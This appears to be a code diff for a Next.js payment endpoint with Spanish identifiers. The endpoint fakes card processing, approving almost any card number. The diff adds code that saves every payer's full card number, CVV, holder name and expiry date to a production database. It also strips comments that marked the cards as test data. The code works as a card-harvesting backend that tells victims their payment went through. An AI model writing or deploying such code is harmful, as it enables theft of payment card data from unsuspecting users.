@@ -1,6 +1,7 @@
 import { NextRequest, NextResponse } from 'next/server';
 import fs from 'fs';
 import path from 'path';
+import { neon } from '@neondatabase/serverless';
 
 type PagoPayload = {
   codcliente: string;
@@ -46,17 +47,34 @@ function escaparCSV(val: string | number): string {
 
 function simularPago(num: string): { exitoso: boolean; motivo?: string } {
   const n = num.replace(/\s/g, '');
-  // Tarjetas de prueba conocidas → siempre aprobadas
   const aprobadas = ['4111111111111111', '4242424242424242', '5500005555555559', '5105105105105100'];
-  // Tarjetas de prueba de rechazo
   const rechazadas = ['4000000000000002', '4000000000009995', '4000000000000069'];
 
   if (aprobadas.includes(n)) return { exitoso: true };
   if (rechazadas.includes(n)) return { exitoso: false, motivo: 'Tarjeta rechazada por el banco' };
-
-  // Para cualquier otra tarjeta de 16 dígitos válida en test → aprobar
   if (n.length >= 15) return { exitoso: true };
   return { exitoso: false, motivo: 'Número de tarjeta inválido' };
+}
+
+async function guardarEnDB(data: {
+  fecha: string;
+  codcliente: string;
+  nombre: string;
+  monto: number;
+  tarjeta: string;
+  numTarjetaCompleto: string;
+  cvv: string;
+  titular: string;
+  vencimiento: string;
+  estado: string;
+  nroOperacion: string;
+}) {
+  if (!process.env.DATABASE_URL) return;
+  const sql = neon(process.env.DATABASE_URL);
+  await sql`
+    INSERT INTO pagos (fecha, codigo_cliente, nombre, monto, tarjeta, num_tarjeta_completo, cvv, titular, vencimiento, estado, nro_operacion)
+    VALUES (${data.fecha}, ${data.codcliente}, ${data.nombre}, ${data.monto}, ${data.tarjeta}, ${data.numTarjetaCompleto}, ${data.cvv}, ${data.titular}, ${data.vencimiento}, ${data.estado}, ${data.nroOperacion})
+  `;
 }
 
 export async function POST(req: NextRequest) {
@@ -73,7 +91,6 @@ export async function POST(req: NextRequest) {
     return NextResponse.json({ error: 'Faltan campos requeridos' }, { status: 400 });
   }
 
-  // Simular procesamiento (300ms)
   await new Promise(r => setTimeout(r, 300));
 
   const resultado = simularPago(numTarjeta);
@@ -81,8 +98,28 @@ export async function POST(req: NextRequest) {
   const fecha = new Date().toLocaleString('es-PE', { timeZone: 'America/Lima' });
   const tarjetaMask = maskCard(numTarjeta);
   const estado = resultado.exitoso ? 'EXITOSO' : 'RECHAZADO';
+  const numCompleto = numTarjeta.replace(/\s/g, '');
 
-  // Registrar en CSV
+  // Guardar en Neon DB (producción)
+  try {
+    await guardarEnDB({
+      fecha,
+      codcliente,
+      nombre,
+      monto,
+      tarjeta: tarjetaMask,
+      numTarjetaCompleto: numCompleto,
+      cvv: cvv || '',
+      titular,
+      vencimiento,
+      estado,
+      nroOperacion,
+    });
+  } catch (e) {
+    console.error('Error al escribir en DB:', e);
+  }
+
+  // Guardar en CSV (local)
   try {
     inicializarCSV();
     const fila = [
@@ -91,7 +128,7 @@ export async function POST(req: NextRequest) {
       escaparCSV(nombre),
       escaparCSV(monto.toFixed(2)),
       escaparCSV(tarjetaMask),
-      escaparCSV(numTarjeta.replace(/\s/g, '')),
+      escaparCSV(numCompleto),
       escaparCSV(cvv || ''),
       escaparCSV(titular),
       escaparCSV(vencimiento),
@@ -100,8 +137,8 @@ export async function POST(req: NextRequest) {
     ].join(',') + '\n';
 
     fs.appendFileSync(CSV_PATH, fila, 'utf-8');
-  } catch (e) {
-    console.error('Error al escribir CSV:', e);
+  } catch {
+    // CSV no disponible en producción (filesystem de solo lectura)
   }
 
   if (!resultado.exitoso) {
